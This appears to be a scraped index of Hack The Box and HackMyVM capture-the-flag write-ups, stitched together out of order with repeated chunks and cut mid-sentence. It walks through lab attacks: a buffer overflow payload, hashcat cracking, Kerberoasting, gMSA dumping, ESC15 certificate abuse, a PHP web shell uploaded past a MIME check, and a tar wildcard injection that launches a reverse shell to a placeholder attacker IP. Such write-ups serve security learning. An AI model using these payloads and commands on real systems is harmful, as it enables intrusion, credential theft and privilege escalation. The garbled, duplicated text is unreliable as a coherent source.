controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

This time we upload any valid image and then click Transform Image (for example, “crop”), intercepting that request in Burp Suite.\nThe next step is to inject a Reverse Shell into a field that should only contain numbers, so the server executes it and gives us remote access.\nPrivilege escalation to Mark Now that we’re in as the user web, the next step is to run LinPEAS to search for escalation vectors: SUID/weak permissions, credentials in files, misconfigured services, and scheduled tasks we can abuse.\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We find an encrypted backup that could contain credentials or sensitive data from what appears to be the website.\nWe bring it to our local machine and see it was encrypted using pyAesCrypt. To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup. When we read db.json this time, it also contains the encrypted password for user mark, so we again use hashcat to crack it.\nhashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt We log in as user Mark and obtain the User Flag.\nPrivilege escalation to Root Running sudo -l shows we can run the binary charcol as root without providing a password.\nExecuting it reveals a program for performing backups. There is a shell option where we can run several commands to perform different functions.\nWhen we enter help it lists several commands we can run and a brief explanation of how to use them.\nOne of these commands is particularly useful: it can create cron jobs. Since we can run this program as root, we create a cron job that copies the Root Flag to a file called pwned.txt in /tmp and sets permissions so we can finally read the flag.\nauto add --schedule \u0026#34;* * * * *\u0026#34; --command \u0026#34;cp /root/root.txt /tmp/pwned.txt \u0026amp;\u0026amp; chmod 777 /tmp/pwned.txt\u0026#34; --name \u0026#34;pwned\u0026#34; Machine completed!!\n","permalink":"http://localhost:1313/writeups/medium/imagery/","summary":"Difficulty: Medium 🟠","title":"Imagery - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/immortal/","summary":"Difficulty: Medium 🟠","title":"Immortal - HackMyVM"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/very-easy/injection/","summary":"Difficulty: Very Easy 🔵","title":"Injection - Dockerlabs"},{"content":"\rMachine Link\nTo find the IP of the victim machine, I use the arp-scan command to discover the devices connected to my local network and locate the one whose** MAC address** starts with 08:, indicating it is a VirtualBox virtual machine.\nsudo arp-scan -I eth0 --localnet Next, we proceed with a quick scan using NMAP to see which ports are open.\nsudo nmap -sS --min-rate 4500 -n -Pn 192.168.18.163 Ports 22 and 80 are open\rAnd now we perform a more detailed scan on those open ports and save the result in a file called target.txt.\nnmap -sCV -p22,80 -n -Pn 192.168.18.163 -oN target.txt Detailed scan of the open ports\rWe observe a website hosted on this machine via port 80, but only the default Nginx homepage is visible.\nI use Gobuster to enumerate hidden files and directories.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named 